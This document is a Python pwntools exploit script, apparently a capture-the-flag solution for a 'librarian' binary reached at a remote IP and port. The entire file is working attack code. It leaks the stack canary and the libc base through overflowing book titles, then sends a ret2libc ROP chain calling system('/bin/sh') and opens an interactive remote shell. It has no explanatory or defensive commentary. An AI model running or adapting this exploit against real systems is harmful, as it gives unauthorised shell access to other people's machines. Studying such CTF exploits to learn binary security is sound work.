from pwn import *
#io = process("./librarian")
io = remote("43.201.16.196",8888)
libc = ELF("./libc.so.6")

def displayBooks():
    io.sendlineafter("choice:","1")
    return io.recvuntil("Menu")

def addBook(title):
    io.sendlineafter("choice:","2")
    io.sendlineafter("Book title:",title)

def addComment(comment):
    io.sendlineafter("choice:","3")
    pass

def clearBooks():
    io.sendlineafter("choice:","4")

def leave():
    io.sendlineafter("choice:","5")


addBook("A"*0x3f)
addBook("B"*0x3f)
addBook("C"*0x3f)
addBook("D"*0x3f)
addBook("E"*0x3f)

leak = displayBooks()
startIndex = leak.index(b"5. ") + 11
canary = u64(leak[startIndex:startIndex+8])
libc.address = u64(leak[startIndex+16:startIndex+22].ljust(8,b"\x00")) - 144656

log.info("CANARY: " + hex(canary))
log.info("LIBC BASE: " + hex(libc.address))

clearBooks()
for i in range(13):
    addBook("A"*0x3f)

popRdi = p64(libc.address + 0x23b65)
ret = p64(libc.address + 0x233d1)

ret2libc  = b"\xff" * 8 + p64(canary) + b"A"*8 
ret2libc += ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
addBook(ret2libc)

addBook("A"*0x3f)

#gdb.attach(io,gdbscript="break *0x555555555b01")
leave()
io.interactive()

